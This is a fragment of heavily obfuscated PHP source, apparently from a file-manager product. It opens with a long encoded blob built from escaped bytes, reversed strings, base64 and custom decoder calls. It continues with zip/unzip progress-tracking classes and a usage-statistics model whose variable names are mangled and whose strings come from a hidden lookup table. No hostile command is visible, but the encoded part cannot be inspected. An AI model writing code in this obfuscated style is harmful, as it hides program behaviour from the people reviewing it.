ûğëUÅÚÌ)')."\xde\xea\x4\xdb\x85\x5f\xf0\xc9\x98\xc3\xce\xe7\xeb\x30\xc4\xfd\x66\x8f\xe3\xb5\x1e\x69\xd1\x10\x9b\x53\xf9\x7d\x21\x67\x21\x4f\xd9\x3b\x19\xa\x79\x97\x54\x41\x53\x1d\x46\x11\x3b\x2a\x62\x47"."\x42\x92\x59\xfa\xf4\x14\xfa\xd3\x3\xbf\x6c\x3b\x73\x37\x82\x12\x2a\xf8\x64\x2d\x9f\x54\xcd\x19\x23\x9b\x2a\x72\x15\x1a\x1\x68\xd7\xc5\x39\x9d\x94\xc2\x5a\x24\x1a\x7b\x7f\x95\x3c\xe6\xd5\xc2".strrev('ËTi¬DÕL29CÏ­q›‰N;eƒ%°Eø,‡ÎìE¸xˆÂùÍÙì\'!éQÍ<2h')._kodDe('MYvXBJF+Fb+2aT8EqQY2WMUWVWb8eKQnf8jkvwzQN0DhyhsihEcANyO8IiMJMgeHYQ==').base64_decode('4o/MO7JRkF8rFMR9lLxlov8dtnGQ1hVvU4mFt0qvrWNizkk3WRQIt1qlfIheAjig')."\x45\xe9\x9c\x27\x3b\xcb\xa4\xf7\x77\xc2\x1a\xb\xb2\xa3\x76\x76\xd2\xb\x3b\x40\x98\x5c\x25\xbb\x44\xe5\x12\xe9\x56\xe9\x9d\x6e\x7f\xf9\xa5\x2b\xd6\xa9\x3\x8a\x22\xbf\xf8\xe\xb7\xde\x3e\xf9".strrev('eÜØ¸àÔ?4ôZ~O™ĞÌÏJ¶àiw¥@·ûŒÈR„hËé†â§Œ…˜Š…” ').strrev('èì¡¹ø'."\r".'gî/¬ùÌ<Â5ëÛ}ŞG›ÊøM´Ï'."\n".'·Eàt¶7QìoCùZ8ıÃ)B/')."\xe1\x3e\x75\x70\xb4\xba\xa\x44\xdd\x48\x8e\x9b\xe5\xe2\x59\x71\x2d\xed\x78\x83\x4e\xea\x35\x90\xb6\xf2\x77\xec\x24\x34\x48\xfd\x2e\x15\xb3\x1e\x72\x43\xef\x61\x5e\xde\x2a\x3e\x85\xe7\x78\x4b".base64_decode('xz2gFR7T+84KQeGXHLpSTqpXvzBRZFee7myGY+6qRV1Yj1CnmGUbxMpcasbM2fNl')."\341\206\30\102\161\77\10\266\361\160\237\11\334\212\230\24\212\163\32\52\314\23\247\274\372\111\242\123\47\273\374\251\105\327\16\360\277\133\60\342\364\100\263\112\232\321\345\117".base64_decode('1pZhgMxTSWdI2hBd2h8mVs+wxKqjW6B4bdH5Lco+VOiHtO+JxUJfyzOz+Iydw6Jz')."\273\250\71\17\224\225\316\115\4\23\354\220\146\220\147\250\165\167\333\11\142\100\232\42\222\245\203\225\134\243\155\272\105\101\270\70\336\27\211\44\62\222\317\302\266\215\115\215".base64_decode('xWqTKNH/YgDZGYkep4TuT4We+09kpKXCa4iSKsW3tJtyd/w86NVsrzQhJfGhbkfI').base64_decode('AAOJEMdWZ19d1aNioo5ejzJRpnIWT3o0UTijkpg7XJrZH05w6ifmb042SX7SjViR')."\11\337\13\144\271\72\226\256\344\354\126\66\304\42\25\311\153\242\274\152\351\201\74\41\25\42\142\44\350\21\54\150\342\160\223\64\63\260\230\133\356\151\222\362\226\123\124\205"._kodDe('KCNHdDPAYCdXjvo94gGO6ke9awlHUbtlUgjX2wgWdJeNxn43+xroRvmvvTV83A/dLg==').base64_decode('WO53AhG3J7sBRlH3O6tAG4kiPf2atLuKjVSEOko5EZHku+RIxRMddrLYw5KLDDDr')."\x5b\xcb\xf5\x7e\x28\x75\xd0\x4a\xc3\x8c\xf3\xff\xff\xfd\x44\xde\xff\xad\x97\xf1\x66\xd7\x31\x49\xbc\xe3\x79\xdd\xc5\xc0\x7f\x33\x96\x6f\x4c\x72\x2\x4d\xa5\xc0\xae\x7e\x38\x77\xd0\x7d\x60\x16".base64_decode('8cejpTjXFmZetpjzLY1dRmnZrLTPVj6xlD1ciibfAH/rslLEbU3mfsS0mz3wTd4n')."\355\255\224\121\220\41\176\60\252\60\217\51\210\361\303\371\362\273\143\74\136\141\247\13\145\211\343\50\313\46\276\212\30\23\346\260\314\317\102\111\174\6\44\136\4\0\137\262".strrev('dÍ#õİ¢PğsçY«a¨Ãe'."\0".'pQâ¿FT‘)’U—XˆädO{æ@µ‹NÀ¤gÙ').strrev('­Z¹•È¢I‚Ü±D¢–U¨Çùotö¶ıÎ»JNÙjÁ/•óKÊ	UËëÈtØÉ')."\x50\x86\xce\xd4\x98\xc8\x33\xc1\x5a\xa9\xbc\x62\xf9\xe3\x97\x42\x2c\x87\x43\x72\x7f\xd9\xca\xef\x2c\x9a\x84\xbb\x73\x42\xb9\x2c\x47\x52\x7c\x95\x5e\x83\x9e\xe2\x2b\xdb\x5f\x18\xb5\x73\xa0\x1c"."\35\334\304\235\241\141\22\77\352\254\150\127\173\15\61\360\201\31\213\316\22\255\246\30\173\351\335\145\274\246\204\163\104\354\312\212\210\17\345\55\234\331\334\111\52\353\0\162".base64_decode('CPks+ckKZ0lshOBcS4sqZUuaRUvKxuGV8uIZJgsx5DT8Mq7tGAvhEt/tCp8c7elp').base64_decode('3XFoh2tdGSTdeiLOO+V8W4MkEjDzowk1SPd2zmtT7gC8jFKWjLCUTEox92zoF9sl').strrev('LZtğô¯À-‰>¬ñ\'½q4{òÁy™$ÖK¥º—ÎRîËóÒ$oL’÷„†')."\x92\x60\xcc\x53\x29\xfe\xe6\xbb\x23\x6b\x4a\x77\x3b\x9a\x41\x10\xf1\x3c\x3c\x66\xb2\x24\x13\x5d\xa1\x1e\xaf\xf\xbb\xdf\xdf\xf5\xc9\x66\xbd\x8e\x8c\xe5\x50\x61\xc2\x2b\x95\x17\x37\x2a\xa2\x9b"."\30\126\251\373\144\241\71\213\313\46\302\174\122\11\20\175\35\201\153\144\111\207\40\154\11\42\124\265\150\127\370\131\137\174\322\151\220\314\263\361\61\103\171\210\335\215\327\1"."\165\35\353\260\130\205\161\14\256\44\113\176\73\327\171\167\52\13\37\244\51\240\147\303\122\165\362\275\352\204\5\142\225\77\42\146\245\23\305\222\45\267\110\140\133\235\351\100"."\276\104\42\171\307\40\147\124\116\164\64\307\75\264\344\104\42\246\57\5\346\210\114\227\246\5\234\111\64\277\356\152\275\134\300\335\63\132\302\32\66\354\144\106\72\46\225\47"."\226\303\213\145\110\205\17\125\156\257\273\125\14\247\356\303\243\250\244\254\75\222\162\106\334\254\120\206\266\250\142\61\232\204\113\12\166\325\121\166\2\24\340\262\64\11\227\55".strrev('y%×‚­Ê‹&çsŒÁÏòæb³á¬Ó¦:ì:R G+İÖJÖÎT‹Y%…fK').base64_decode('pVZUzDxhK0Ru1y5QidaylArUVWhLlNNxkVZBd4PWifdo2T1ThWRZEaSyqki04tK3')."\x9c\x3a\x1c\x2e\xb8\x8c\x18\xf0\xee\x9\xdc\x15\xcc\x36\x74\x52\xcc\x1a\x3\x42\xad\x8d\x69\xa8\x4f\x71\xd0\xf7\x52\x7e\x20\x6f\xf2\x3d\x23\x25\x34\x10\xb1\xf6\x74\xa0\xe8\x46\x64\x59\x6d\xce"."\x79\x9a\x2f\x49\xe\x53\x2b\x2a\xcc\x7b\xf0\xb9\xbe\xfc\x4\x9d\xd5\xd8\x35\x80\x64\x69\x40\x8f\x3c\xa6\x6d\x24\x75\xa7\x57\x56\xd9\x4b\x13\x4d\x67\x1f\xc9\x4a\x82\x42\x97\x8c\x4e\x48\x19\x1c"."\x3a\x6\x15\xa4\x58\x4\x4\x7c\x9d\x10\x97\xd3\xfa\x24\x8e\x45\xcc\x9\x87\x85\x7\xe5\x13\xe0\x96\x81\x5e\x50\x36\xe3\x8b\x70\x7e\x35\x45\x3c\x8a\xd2\x7d\x95\x26\xc7\xcc\xa2\xed\xc1\x69\x71"."\xb3\x40\x7e\x9b\x4c\xdb\x16\x17\xf6\xf4\x58\x4f\x98\x41\xbc\x39\x7a\x24\x7d\x14\x14\x12\xf7\x50\xb8\x51\xe4\x82\x83\x4c\x5b\x42\x5e\x48\x10\xae\x4a\xf1\x79\x39\xa6\xd3\x54\x42\x94\x1c\x11\x7c".base64_decode('ccIj8t4HV6atJdelrgCgw2nCHGH+GrEtuWiPuFohKBP8CUw/WaOGWOlbfpriBz//')."\136\15\63\212\360\142\227\257\277\320\347\50\116\337\75\342\212\247\337\126\3\210\124\105\25\324\311\67\221\165\201\51\116\54\36\53\113\352\14\304\142\313\43\321\26\352\23\274"."\54\231\224\222\64\224\312\222\72\333\42\35\23\245\5\333\3\241\160\131\32\126\146\352\120\205\143\55\232\24\352\44\255\44\67\202\23\265\42\324\274\124\264\204\334\75\13\111"."\175\41\143\62\1\74\273\311\210\151\131\166\112\227\354\112\365\234\360\250\46\312\344\215\344\200\20\356\151\22\363\156\61\327\207\74\340\174\140\307\245\63\310\46\51\124\204\25"."\221\72\240\356\150\1\240\330\107\72\137\353\234\221\26\227\351\76\307\245\273\4\47\353\201\20\30\151\316\311\33\55\1\114\255\210\40\131\312\133\176\353\100\122\5\2\160\303"."\x96\x98\xa0\xc5\xd6\x6f\x26\xa4\x5b\x5\x7a\x8c\x1\x2b\x4f\x40\xa9\xa4\x6c\x46\xc3\x8e\x64\x5b\xeb\xab\x78\xf7\x4c\xa5\x79\x78\xc5\xb\x39\xdb\xff\x1\xae\xd7\x8d\xa\x29\xac\x0\x0", 10, -8))); goto Bğ¶‹•ŒÙ; E®”Â’ …Á: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $´è…áÕ =& $_SERVER[ªÏ§Ë·]; parent::startAfter(); Hook::bind($´è…áÕ[1778], array($this, $´è…áÕ[1779])); Hook::bind($´è…áÕ[1218], array($this, $´è…áÕ[1780])); $“Ş¬ÄûÙ =& $this->task; $“Ş¬ÄûÙ[$´è…áÕ[1781]] = $´è…áÕ[1219]; if (!$“Ş¬ÄûÙ[$´è…áÕ[1567]]) { $“Ş¬ÄûÙ[$´è…áÕ[1567]] = LNG($´è…áÕ[1782]); } } protected function endAfter() { $Ô‡çÃ± =& $_SERVER[ªÏ§Ë·]; parent::endAfter(); Hook::unbind($Ô‡çÃ±[1778], array($this, $Ô‡çÃ±[1779])); Hook::unbind($Ô‡çÃ±[1218], array($this, $Ô‡çÃ±[1780])); } public function updateAfter() { $‚ã•ÅŒ½ =& $_SERVER[ªÏ§Ë·]; $Šô°Å´Å =& $this->task; if (!$Šô°Å´Å[$‚ã•ÅŒ½[814]] || !$Šô°Å´Å[$‚ã•ÅŒ½[791]]) { return; } if ($Šô°Å´Å[$‚ã•ÅŒ½[1781]] == $‚ã•ÅŒ½[1219]) { $’Ñêé‡Ü = 0; if ($Šô°Å´Å[$‚ã•ÅŒ½[1720]]) { $’Ñêé‡Ü = $Šô°Å´Å[$‚ã•ÅŒ½[1721]] / $Šô°Å´Å[$‚ã•ÅŒ½[1720]]; } $Šô°Å´Å[$‚ã•ÅŒ½[1669]] = $’Ñêé‡Ü * 0.3; } else { if ($Šô°Å´Å[$‚ã•ÅŒ½[1781]] == $‚ã•ÅŒ½[351]) { $’Ñêé‡Ü = $Šô°Å´Å[$‚ã•ÅŒ½[1668]] / $Šô°Å´Å[$‚ã•ÅŒ½[814]]; $Šô°Å´Å[$‚ã•ÅŒ½[1669]] = 0.3 + $’Ñêé‡Ü * 0.4; } else { if ($Šô°Å´Å[$‚ã•ÅŒ½[1781]] == $‚ã•ÅŒ½[117]) { $ÈÈÏ—¤° = 0; if ($Šô°Å´Å[$‚ã•ÅŒ½[1722]] == $‚ã•ÅŒ½[117]) { $ÈÈÏ—¤° = $Šô°Å´Å[$‚ã•ÅŒ½[1721]]; } $’Ñêé‡Ü = ($Šô°Å´Å[$‚ã•ÅŒ½[1725]] + $ÈÈÏ—¤°) / $Šô°Å´Å[$‚ã•ÅŒ½[791]]; $Šô°Å´Å[$‚ã•ÅŒ½[1669]] = 0.3 + 0.4 + $’Ñêé‡Ü * 0.3; } } } if ($Šô°Å´Å[$‚ã•ÅŒ½[1669]] > 0) { $ÒúÅİ¡ = timeFloat() - $Šô°Å´Å[$‚ã•ÅŒ½[1671]] - $Šô°Å´Å[$‚ã•ÅŒ½[1674]]; $Šô°Å´Å[$‚ã•ÅŒ½[1675]] = $ÒúÅİ¡ * (1 - $Šô°Å´Å[$‚ã•ÅŒ½[1669]]) / $Šô°Å´Å[$‚ã•ÅŒ½[1669]]; } } public function addFile($‡ï—·ªŸ) { $¶Ì¡š¤ =& $_SERVER[ªÏ§Ë·]; $º¨Úù‘Û =& $this->task; $ƒû¯—½¨ = IO::info($‡ï—·ªŸ); $º¨Úù‘Û[$¶Ì¡š¤[1718]] = $ƒû¯—½¨[$¶Ì¡š¤[42]]; $º¨Úù‘Û[$¶Ì¡š¤[1720]] = $ƒû¯—½¨[$¶Ì¡š¤[86]]; $º¨Úù‘Û[$¶Ì¡š¤[1721]] = 0; $º¨Úù‘Û[$¶Ì¡š¤[1089]] = $¶Ì¡š¤[1741]; $º¨Úù‘Û[$¶Ì¡š¤[1722]] = $¶Ì¡š¤[1219]; $º¨Úù‘Û[$¶Ì¡š¤[791]] = $ƒû¯—½¨[$¶Ì¡š¤[86]]; $º¨Úù‘Û[$¶Ì¡š¤[814]] = 1; $Ï°¢ü = 0; $º¨Úù‘Û[$¶Ì¡š¤[1729]] = array($¶Ì¡š¤[1730] => $Ï°¢ü + 1, $¶Ì¡š¤[458] => $ƒû¯—½¨[$¶Ì¡š¤[42]], $¶Ì¡š¤[94] => $ƒû¯—½¨[$¶Ì¡š¤[94]], $¶Ì¡š¤[547] => $ƒû¯—½¨[$¶Ì¡š¤[547]] ? $ƒû¯—½¨[$¶Ì¡š¤[547]] : $ƒû¯—½¨[$¶Ì¡š¤[94]]); $this->update(); } public function unzipAfter($ø²íÈ’¾) { $àãº¸ş† =& $_SERVER[ªÏ§Ë·]; $ ¤Ã¢Ô° =& $this->task; $ ¤Ã¢Ô°[$àãº¸ş†[1781]] = $àãº¸ş†[117]; $›ï²¸Êœ = IO::infoWithChildren($ø²íÈ’¾); $Ø¯şÜµ› = 0; $ ¤Ã¢Ô°[$àãº¸ş†[1729]] = array($àãº¸ş†[1730] => $Ø¯şÜµ› + 1, $àãº¸ş†[458] => $›ï²¸Êœ[$àãº¸ş†[42]], $àãº¸ş†[94] => $›ï²¸Êœ[$àãº¸ş†[94]], $àãº¸ş†[547] => $›ï²¸Êœ[$àãº¸ş†[547]] ? $›ï²¸Êœ[$àãº¸ş†[547]] : $›ï²¸Êœ[$àãº¸ş†[94]]); if ($›ï²¸Êœ[$àãº¸ş†[43]] == $àãº¸ş†[210]) { $ ¤Ã¢Ô°[$àãº¸ş†[814]] = 1; } else { $ ¤Ã¢Ô°[$àãº¸ş†[814]] = $›ï²¸Êœ[$àãº¸ş†[89]][$àãº¸ş†[87]]; } $ ¤Ã¢Ô°[$àãº¸ş†[1089]] = $àãº¸ş†[12]; $ ¤Ã¢Ô°[$àãº¸ş†[1722]] = 0; $ ¤Ã¢Ô°[$àãº¸ş†[1668]] = 0; $ ¤Ã¢Ô°[$àãº¸ş†[1720]] = 0; $ ¤Ã¢Ô°[$àãº¸ş†[1721]] = 0; $ ¤Ã¢Ô°[$àãº¸ş†[1718]] = $àãº¸ş†[12]; $ ¤Ã¢Ô°[$àãº¸ş†[1725]] = 0; $ ¤Ã¢Ô°[$àãº¸ş†[791]] = $›ï²¸Êœ[$àãº¸ş†[86]]; $this->update(); self::log($àãº¸ş†[1783] . json_encode(array($ ¤Ã¢Ô°, $›ï²¸Êœ))); } public function nameParse($»™Ó‹½Î) { $Æç˜“öË =& $_SERVER[ªÏ§Ë·]; $áóÏĞ×Œ =& $this->task; if ($áóÏĞ×Œ[$Æç˜“öË[1781]] == $Æç˜“öË[1219]) { $áóÏĞ×Œ[$Æç˜“öË[1781]] = $Æç˜“öË[351]; $áóÏĞ×Œ[$Æç˜“öË[1725]] = 0; $áóÏĞ×Œ[$Æç˜“öË[791]] = 0; } $ÚŸ¡ëèÀ = get_path_this($»™Ó‹½Î); if (strstr($ÚŸ¡ëèÀ, $Æç˜“öË[10])) { $áóÏĞ×Œ[$Æç˜“öË[1668]] += 1; $áóÏĞ×Œ[$Æç˜“öË[814]] += 1; } $áóÏĞ×Œ[$Æç˜“öË[1718]] = $»™Ó‹½Î; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $ÏÔê²éÎ =& $_SERVER[ªÏ§Ë·]; parent::startAfter(); Hook::bind($ÏÔê²éÎ[1784], array($this, $ÏÔê²éÎ[1779])); $ŸÀŞˆù’ =& $this->task; $ŸÀŞˆù’[$ÏÔê²éÎ[1781]] = $ÏÔê²éÎ[1219]; if (!$ŸÀŞˆù’[$ÏÔê²éÎ[1567]]) { $ŸÀŞˆù’[$ÏÔê²éÎ[1567]] = LNG($ÏÔê²éÎ[1785]); } } protected function endAfter() { $¶¶«âÏ© =& $_SERVER[ªÏ§Ë·]; parent::endAfter(); Hook::unbind($¶¶«âÏ©[1784], array($this, $¶¶«âÏ©[1779])); } public function updateAfter() { $ğ“Â…¢ =& $_SERVER[ªÏ§Ë·]; $»ıëÅù¢ =& $this->task; if (!$»ıëÅù¢[$ğ“Â…¢[814]] || !$»ıëÅù¢[$ğ“Â…¢[791]]) { return; } if ($»ıëÅù¢[$ğ“Â…¢[1781]] == $ğ“Â…¢[1219]) { $ÎÎø®şÈ = $»ıëÅù¢[$ğ“Â…¢[1721]]; if ($»ıëÅù¢[$ğ“Â…¢[1722]] != $ğ“Â…¢[1219]) { $ÎÎø®şÈ = 0; } $“œ©½¢â = ($»ıëÅù¢[$ğ“Â…¢[1725]] + $ÎÎø®şÈ) / $»ıëÅù¢[$ğ“Â…¢[791]]; $»ıëÅù¢[$ğ“Â…¢[1669]] = $“œ©½¢â * 0.3; } else { if ($»ıëÅù¢[$ğ“Â…¢[1781]] == $ğ“Â…¢[351]) { $“œ©½¢â = $»ıëÅù¢[$ğ“Â…¢[1668]] / $»ıëÅù¢[$ğ“Â…¢[814]]; $»ıëÅù¢[$ğ“Â…¢[1669]] = 0.3 + $“œ©½¢â * 0.5; } else { if ($»ıëÅù¢[$ğ“Â…¢[1781]] == $ğ“Â…¢[117]) { $“œ©½¢â = 0; if ($»ıëÅù¢[$ğ“Â…¢[1720]]) { $“œ©½¢â = $»ıëÅù¢[$ğ“Â…¢[1721]] / $»ıëÅù¢[$ğ“Â…¢[1720]]; } $»ıëÅù¢[$ğ“Â…¢[1669]] = 0.3 + 0.5 + $“œ©½¢â * 0.2; } } } if ($»ıëÅù¢[$ğ“Â…¢[1669]] > 0) { $Èé…®—î = timeFloat() - $»ıëÅù¢[$ğ“Â…¢[1671]] - $»ıëÅù¢[$ğ“Â…¢[1674]]; $»ıëÅù¢[$ğ“Â…¢[1675]] = $Èé…®—î * (1 - $»ıëÅù¢[$ğ“Â…¢[1669]]) / $»ıëÅù¢[$ğ“Â…¢[1669]]; } } public function copyFileStart($‘‘şªµ³, $“†À§»ğ, $¡Ì¸ú·, $™ÛãÏ³‘, $«¯•ûÉ, $ø­åóÚû) { $…¹Ôñ˜ =& $_SERVER[ªÏ§Ë·]; parent::copyFileStart($‘‘şªµ³, $“†À§»ğ, $¡Ì¸ú·, $™ÛãÏ³‘, $«¯•ûÉ, $ø­åóÚû); $Œó¥ì› =& $this->task; if ($Œó¥ì›[$…¹Ôñ˜[1781]] == $…¹Ôñ˜[351]) { $Œó¥ì›[$…¹Ôñ˜[1781]] = $…¹Ôñ˜[117]; } $this->update(); } public function copyFileEnd($šèŠµÓú, $¥ÚŒ¹¨ç, $¥¹¨÷Ã°, $ğô–÷æ, $Ó©ú¶å, $¿Ïá‘Ïß) { $æ˜Ï„©· =& $_SERVER[ªÏ§Ë·]; $×—¡§êª =& $this->task; $×—¡§êª[$æ˜Ï„©·[1721]] = $×—¡§êª[$æ˜Ï„©·[1720]]; $×—¡§êª[$æ˜Ï„©·[1725]] += $×—¡§êª[$æ˜Ï„©·[1720]]; $×—¡§êª[$æ˜Ï„©·[1722]] = $æ˜Ï„©·[12]; $this->update(); } public function nameParse($¶šÚìù) { $œÍíÆš÷ =& $_SERVER[ªÏ§Ë·]; $‚®÷èâ± =& $this->task; if ($‚®÷èâ±[$œÍíÆš÷[1668]] < $‚®÷èâ±[$œÍíÆš÷[814]]) { $ºÛ¤Ìòâ = get_path_this($¶šÚìù); if (strstr($ºÛ¤Ìòâ, $œÍíÆš÷[10])) { $‚®÷èâ±[$œÍíÆš÷[1668]] += 1; } } if ($‚®÷èâ±[$œÍíÆš÷[1781]] == $œÍíÆš÷[1219]) { $‚®÷èâ±[$œÍíÆš÷[1781]] = $œÍíÆš÷[351]; } $‚®÷èâ±[$œÍíÆš÷[1718]] = $¶šÚìù; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($•¼ç¶Áá) { $ ª¿İß¿ =& $_SERVER[ªÏ§Ë·]; $¡‰ÌÀ½£ = array($ ª¿İß¿[628] => array($ ª¿İß¿[43] => $ ª¿İß¿[1786], $ ª¿İß¿[311] => array($ ª¿İß¿[234], $ ª¿İß¿[793], $ ª¿İß¿[1787], $ ª¿İß¿[1788])), $ ª¿İß¿[1789] => array($ ª¿İß¿[43] => $ ª¿İß¿[1790], $ ª¿İß¿[311] => array($ ª¿İß¿[234], $ ª¿İß¿[791], $ ª¿İß¿[1791], $ ª¿İß¿[1792], $ ª¿İß¿[1793]))); if (!isset($¡‰ÌÀ½£[$•¼ç¶Áá])) { return !1; } $this->optionType = $¡‰ÌÀ½£[$•¼ç¶Áá][$ ª¿İß¿[43]]; $this->field = $¡‰ÌÀ½£[$•¼ç¶Áá][$ ª¿İß¿[311]]; return !0; } public function listData($¨„œÇ† = false, $Ú¶úÆÂ = "\x6d\157\144\151\x66\x79\x54\x69\x6d\x65", $ÀÑ«Ô¯ß = false) { return parent::listData($¨„œÇ†, $Ú¶úÆÂ, $ÀÑ«Ô¯ß); } public function trendList($Â×²³Ãš) { $ù°³íà  =& $_SERVER[ªÏ§Ë·]; $ì³åêÙ = $this->listData(); if ($ì³åêÙ) { $ÍË¦Éä´ = end($ì³åêÙ); $–í®× = date($ù°³íà [1794], strtotime($ù°³íà [1795])); if ($ÍË¦Éä´[$ù°³íà [234]] == $–í®×) { return $ì³åêÙ; } $¸¥óí’… = strtotime($ÍË¦Éä´[$ù°³íà [234]]); } if (!isset($¸¥óí’…)) { $¯ Õèí¤ = $Â×²³Ãš == $ù°³íà [628] ? $ù°³íà [563] : $ù°³íà [853]; $¸¥óí’… = Model($¯ Õèí¤)->min($ù°³íà [211]); } $åªáù‡ = $ù°³íà [1796] . ucfirst($Â×²³Ãš); $Û¡í±¤ì = $this->dateList($¸¥óí’…); foreach ($Û¡í±¤ì as $–í®×) { $this->{$åªáù‡}($–í®×); } return $this->listData(); } private function dateList($³¢ß¦‘›) { $¨ºîıÆÀ =& $_SERVER[ªÏ§Ë·]; $ã×¶ùº¾ = $³¢ß¦‘›; $—†ô¶¸ø = strtotime($¨ºîıÆÀ[1795]); $êÉéúÇ = array(); while ($ã×¶ùº¾ <= $—†ô¶¸ø) { $êÉéúÇ[] = date($¨ºîıÆÀ[1794], $ã×¶ùº¾); $ã×¶ùº¾ = strtotime($¨ºîıÆÀ[1797], $ã×¶ùº¾); } return $êÉéúÇ; } public function _recordUser($Æ˜®…ÌÁ = '') { $ØåÎô‚§ =& $_SERVER[ªÏ§Ë·]; $–¤¸”œü = strtotime(date($ØåÎô‚§[1798], strtotime($Æ˜®…ÌÁ))); $³¢Üº× = strtotime(date($ØåÎô‚§[1799], strtotime($Æ˜®…ÌÁ))); $ºŸ’Ó¿£ = array($ØåÎô‚§[211] => array($ØåÎô‚§[1038], $³¢Üº×)); $×åÆÍ¯ = Model($ØåÎô‚§[563])->where($ºŸ’Ó¿£)->count($ØåÎô‚§[1667]); $ºŸ’Ó¿£[$ØåÎô‚§[211]] = array($ØåÎô‚§[371], array($–¤¸”œü, $³¢Üº×)); $¨êÃ¯ = Model($ØåÎô‚§[563])->where($ºŸ’Ó¿£)->count($ØåÎô‚§[1667]); $ºŸ’Ó¿£[$ØåÎô‚§[43]] = $ØåÎô‚§[1800]; $À¾èŒÀû = Model($ØåÎô‚§[1801])->where($ºŸ’Ó¿£)->count($ØåÎô‚§[1802]); $™¾‰£ŸŞ = array($ØåÎô‚§[234] => $Æ˜®…ÌÁ, $ØåÎô‚§[793] => (int) $×åÆÍ¯, $ØåÎô‚§[1787] => (int) $¨êÃ¯, $ØåÎô‚§[1788] => (int) $À¾èŒÀû); return $this->insert($™¾‰£ŸŞ); } public function _recordStore($Äí°à¨î = '') { $ªÙÖò¦  =& $_SERVER[ªÏ§Ë·]; $Ã²ç¶ÆÀ = strtotime(date($ªÙÖò¦ [1799], strtotime($Äí°à¨î))); $¾¾ØõÒ½ = array($ªÙÖò¦ [211] => array($ªÙÖò¦ [1038], $Ã²ç¶ÆÀ)); $Íİ±ö«Å = Model($ªÙÖò¦ [509])->where($¾¾ØõÒ½)->sum($ªÙÖò¦ [86]); $¾¾ØõÒ½[$ªÙÖò¦ [448]] = 0; $Í ù¾½ = Model($ªÙÖò¦ [853])->where($¾¾ØõÒ½)->sum($ªÙÖò¦ [86]); $¾¾ØõÒ½[$ªÙÖò¦ [449]] = 1; $è’¹¸ñË = Model($ªÙÖò¦ [853])->where($¾¾ØõÒ½)->sum($ªÙÖò¦ [86]); $¾¾ØõÒ½[$ªÙÖò¦ [449]] = 2; $üÁè²†¥ = Model($ªÙÖò¦ [853])->where($¾¾ØõÒ½)->sum($ªÙÖò¦ [86]); $‚ç„¡¡… = array($ªÙÖò¦ [234] => $Äí°à¨î, $ªÙÖò¦ [791] => (int) $Í ù¾½, $ªÙÖò¦ [1791] => (int) $Íİ±ö«Å, $ªÙÖò¦ [1792] => (int) $è’¹¸ñË, $ªÙÖò¦ [1793] => (int) $üÁè²†¥); return $this->insert($‚ç„¡¡…); } public function trend($„Âëˆù¡, $ú‘ì•Ñï) { $Ğğ–¶Ëû =& $_SERVER[ªÏ§Ë·]; if (!$this->init($„Âëˆù¡)) { return !1; } $¤ÓÉîô‹ = $this->trendList($„Âëˆù¡); if ($¤ÓÉîô‹ && $ú‘ì•Ñï != $Ğğ–¶Ëû[1640]) { $Åœİé´¿ = $¤ÓÉîô‹[0][$Ğğ–¶Ëû[234]]; $°±÷©­Ç = $this->validDate($ú‘ì•Ñï, $Åœİé´¿); $îÔ¸ú™ = array(); $Ë–Ş…Ù  = array_to_keyvalue($¤ÓÉîô‹, $Ğğ–¶Ëû[234]); foreach ($°±÷©­Ç as $ßá¿ ©ö) { if (isset($Ë–Ş…Ù [$ßá¿ ©ö])) { $à–Õµ = $Ë–Ş…Ù [$ßá¿ ©ö]; } else { $à–Õµ = end($¤ÓÉîô‹); $à–Õµ[$Ğğ–¶Ëû[234]] = $ßá¿ ©ö; if ($„Âëˆù¡ == $Ğğ–¶Ëû[628]) { $à–Õµ[$Ğğ–¶Ëû[1787]] = $à–Õµ[$Ğğ–¶Ëû[1788]] = 0; } } $îÔ¸ú™[] = $à–Õµ; } $¤ÓÉîô‹ = $îÔ¸ú™; } $‚À†“Í½ = array($Ğğ–¶Ëû[628] => array($Ğğ–¶Ëû[793] => LNG($Ğğ–¶Ëû[1803]), $Ğğ–¶Ëû[1787] => LNG($Ğğ–¶Ëû[1804]), $Ğğ–¶Ëû[1788] => LNG($Ğğ–¶Ëû[1805])), $Ğğ–¶Ëû[1789] => array($Ğğ–¶Ëû[791] => LNG($Ğğ–¶Ëû[1806]), $Ğğ–¶Ëû[1791] => LNG($Ğğ–¶Ëû[1807]), $Ğğ–¶Ëû[1792] => LNG($Ğğ–¶Ëû[1808]), $Ğğ–¶Ëû[1793] => LNG($Ğğ–¶Ëû[1809]))); $»½¦ÒúÜ = array($Ğğ–¶Ëû[628] => $Ğğ–¶Ëû[1810], $Ğğ–¶Ëû[1789] => $Ğğ–¶Ëû[86]); if (empty($¤ÓÉîô‹)) { $ßá¿ ©ö = date($Ğğ–¶Ëû[1794], strtotime($Ğğ–¶Ëû[1795])); $”š¶Ğ› = array($Ğğ–¶Ëû[234] => $ßá¿ ©ö); foreach ($‚À†“Í½[$„Âëˆù¡] as $Ş¿úÁµ => $áõ®áÚ) { $”š¶Ğ›[$Ş¿úÁµ] = 0; } $¤ÓÉîô‹[] = $”š¶Ğ›; } $’°¨ûÅ¡ = array(); foreach ($¤ÓÉîô‹ as $áõ®áÚ) { if ($„Âëˆù¡ == $Ğğ–¶Ëû[1789] && $áõ®áÚ[$Ğğ–¶Ëû[1791]] > $áõ®áÚ[$Ğğ–¶Ëû[791]]) { $áõ®áÚ[$Ğğ–¶Ëû[1791]] = $áõ®áÚ[$Ğğ–¶Ëû[791]]; } foreach ($‚À†“Í½[$„Âëˆù¡] as $Ş¿úÁµ => $Ğ³­›¶) { $à–Õµ = array($Ğğ–¶Ëû[234] => $áõ®áÚ[$Ğğ–¶Ëû[234]], $Ğğ–¶Ëû[1567] => $Ğ³­›¶); $à–Õµ[$»½¦ÒúÜ[$„Âëˆù¡]] = isset($áõ®áÚ[$Ş¿úÁµ]) ? $áõ®áÚ[$Ş¿úÁµ] : 0; $’°¨ûÅ¡[] = $à–Õµ; } } return $’°¨ûÅ¡; } public function validDate($Ëæ¡ôõñ, $´œá®¾Ù) { $°â„ß±Á =& $_SERVER[ªÏ§Ë·]; $§•­É’ = date($°â„ß±Á[1794], strtotime($°â„ß±Á[1795])); $œ¨ºÁŞË = array($§•­É’); switch ($Ëæ¡ôõñ) { case $°â„ß±Á[1647]: $¢¬¼£è = mktime(0, 0, 0, date($°â„ß±Á[1811]), date($°â„ß±Á[1386]) - date($°â„ß±Á[1450]) + 7 - 7, date($°â„ß±Á[1812])); 